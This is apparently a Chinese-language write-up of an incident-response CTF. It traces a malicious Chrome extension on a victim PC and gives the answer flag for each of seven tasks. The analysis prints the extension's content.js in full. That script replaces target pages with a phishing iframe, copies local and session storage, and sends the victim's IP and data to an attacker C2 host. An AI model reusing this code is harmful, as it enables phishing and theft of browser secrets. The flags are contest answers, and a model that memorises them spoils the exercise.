---
title: "2026年Solar应急响应3月月赛"
date: 2026-05-23
lastmod: "2026-05-23T11:37:51+0800"
---
<!-- generated-by: obsidian_git_blog_pipeline -->

## 谁偷了我的数据

```
某科技公司（目标域名设定为 solarsecurity.cn）的安全运维人员小李，近期在负责搭建内部的安全运营平台。但在最近的例行检查中，态势感知设备发出高危告警：小李的办公电脑存在频繁的异常外联，且伴随被远控的迹象。目前仅捕获到其对外访问的可疑IP地址为：47.105.126.219。 请以此为线索上机排查，还原完整的攻击链路。（注：部分恶意行为可能需要特定的环境触发条件，请结合日常用户操作习惯进行排查。

账号密码：Solar/Solar2026

注意：因服务器占用资源较大，开机需耐心等待。如短时间内频繁重启虚拟机将进行禁赛处理。
```

### 任务1

```
任务名称：初露端倪（寻找发起连接的主程序）

任务分数：2.00

任务类型：静态Flag

安全设备捕获到了恶意的网络通信，但究竟是哪个本地程序在发起这些请求？请排查并提交实际建立该可疑连接的“宿主”程序绝对路径。 提交格式： flag{C:\xx\xx\xx.exe}
```

根据题目信息已知可以ip地址为：47.105.126.219
可以通过火绒剑监控查看到响应进程，也可以直接通过netstat查看网络连接情况

![](assets/2026%E5%B9%B4solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%943%E6%9C%88%E6%9C%88%E8%B5%9B-20260422083838270.png)

```
flag{C:\Program Files\Google\Chrome\Application\chrome.exe}
```
### 任务2

```
任务名称：顺藤摸瓜（深入排查隐蔽恶意组件）

任务分数：2.00

任务类型：静态Flag

经验丰富的应急响应人员深知，刚才找到的宿主程序本身是合法的白名单软件，它只是一个“躯壳”。真正的幕后黑手是潜伏在其中被加载的某个恶意核心组件。请深入排查，揪出这个隐蔽的恶意模块，并提交该组件的唯一标识符（ID）。 提交格式： flag{xxxxxxxxxxxx}
```

shift+esc打开浏览器任务管理器查看发服务

![](assets/2026%E5%B9%B4solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%943%E6%9C%88%E6%9C%88%E8%B5%9B-20260422084938365.png)

能看到正在运行的Service Worker，并且显示了关联的插件ID bibkdnmjdmickicfinmfmelnhicamlde

找到对应插件

![](assets/2026%E5%B9%B4solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%943%E6%9C%88%E6%9C%88%E8%B5%9B-20260422085157490.png)

查看加载来源，定位文件位置

![](assets/2026%E5%B9%B4solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%943%E6%9C%88%E6%9C%88%E8%B5%9B-20260422085232137.png)

查看文件内容，background.js里存在C2地址，确认为恶意服务

![](assets/2026%E5%B9%B4solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%943%E6%9C%88%E6%9C%88%E8%B5%9B-20260422085338703.png)

```
flag{bibkdnmjdmickicfinmfmelnhicamlde}
```
### 任务3

```
任务名称：时间刻度（锁定本地落地时间）

任务分数：2.00

任务类型：静态Flag

梳理时间线是还原攻击过程的关键一步。请查明这个恶意组件最初被植入到受害者本地主机的准确修改时间。 提交格式： flag{YYYY-M-D-H:MM:SS} （注意带上连字符和冒号）
```

文件修改时间通常就是其落地的初始时间
具体还需要查看其核心时间属性 MACB
这个要用autopsy看

但这里答案就是其修改时间

![](assets/2026%E5%B9%B4solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%943%E6%9C%88%E6%9C%88%E8%B5%9B-20260422090902525.png)

```
flag{2025-9-26-3:33:35}
```
### 任务4

```
任务名称：追根溯源（寻找初始感染源）

任务分数：2.00

任务类型：静态Flag

小李究竟是怎么中招的？请结合受害主机留下的历史痕迹，找出小李最初获取/下载该恶意组件的来源网站地址。 提交格式： flag{http://xxx.com/}
```

![](assets/2026%E5%B9%B4solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%943%E6%9C%88%E6%9C%88%E8%B5%9B-20260422091210748.png)

从谷歌的下载记录来看确实是chrome下载的恶意组件，查看其下载地址得到来源网站地址
```
flag{http://blog.fake-sec-tools.com/}
```
### 任务5

```
任务名称：代码审计（剖析组件核心逻辑）

任务分数：2.00

任务类型：静态Flag

提取出该恶意组件的源码后，我们需要明确它的窃密行为。请对其进行代码审计，找出代码中用于静默获取受害主机互联网出口IP的外部API地址。 提交格式： flag{https://xxx.com/xxx}
```

manifest.json是配置文件，icon.png是图片，分析background.js和content.js

```
const FAKE_SITE_URL = "http://47.105.126.219:8080/fake_site/index.html";
const C2_HOST = "http://47.105.126.219:8080";

console.log("Stanley Module Loaded: Target Domain Detected.");

window.stop();//立即停止对原始目标网页的加载

const iframe = document.createElement('iframe');
iframe.src = FAKE_SITE_URL;
iframe.style.cssText = `
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    border: none; z-index: 9999999; background: white;
`;
document.documentElement.innerHTML = "";
document.documentElement.appendChild(iframe);

//抓取当前页面的Local Storage和SessionStorage的敏感信息
const storageDump = {
    local: JSON.parse(JSON.stringify(localStorage || {})),
    session: JSON.parse(JSON.stringify(sessionStorage || {}))
};

//利用第三方API获取受害者的真实公网IP
fetch('https://api.ipify.org?format=json', { cache: 'no-store' })
    .then(r => r.json())
    .then(data => {
        chrome.runtime.sendMessage({
            type: "REGISTER_VICTIM",
            ip: data.ip || "fetch-ok-no-ip",
            domain: window.location.hostname,
            storage: storageDump, // 新增
            ua: navigator.userAgent, // 新增
            referrer: document.referrer || "" // 新增
        });
    })
    //错误处理
    .catch(() => {
        chrome.runtime.sendMessage({
            type: "REGISTER_VICTIM",
            ip: "Unknown_IP_" + Math.random().toString(36).substr(2, 5),
            domain: window.location.hostname,
            storage: storageDump,
            ua: navigator.userAgent,
            referrer: document.referrer || ""
        });
    });
```

在上面的content.js代码里看到外部接口，其核心内哦让那个是当用户访问目标网站时，脚本立即停止原页面加载，并通过iframe注入围在钓鱼页面，同时启动键盘记录器（Keylogger）和本地存储窃取
```
flag{https://api.ipify.org?format=json}
```
### 任务6

```
任务名称：致命诱饵

任务分数：2.00

任务类型：静态Flag

通过深入分析发现，该恶意组件不仅窃密，还会向受害者下发欺骗性的伪造弹窗。请找出受害者点击弹窗后，被重定向去下载后续恶意负载（远控木马）的钓鱼网站完整URL。 提交格式： flag{http://x.x.x.x:port/xxx/xxx/xx}
```

既然说重定位到钓鱼网站，说明还下载了远控木马，那应该就是这个 运维助手.exe 了

![](assets/2026%E5%B9%B4solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%943%E6%9C%88%E6%9C%88%E8%B5%9B-20260422093354824.png)

这里index.html是默认路径
```
flag{http://47.105.126.219:8080/fake/index.html}
```
### 任务7

```
任务名称：终极远控（提取C2基础设施）

任务分数：2.00

任务类型：静态Flag

受害者在上述钓鱼页面中被诱导下载并执行了进一步的远控木马。请对该木马文件进行分析（或结合流量/日志），提取出攻击者最终用于深度控制受害主机的C2地址和端口。 提交格式： flag{x.x.x.x:port}
```

使用微步沙箱和奇安信沙箱查看

![](assets/2026%E5%B9%B4solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%943%E6%9C%88%E6%9C%88%E8%B5%9B-20260422094134066.png)

找到c2地址和端口
或者直接在火绒剑里查看 运维助手.exe的 外联信息得到
```
flag{143.55.28.36:1234}
```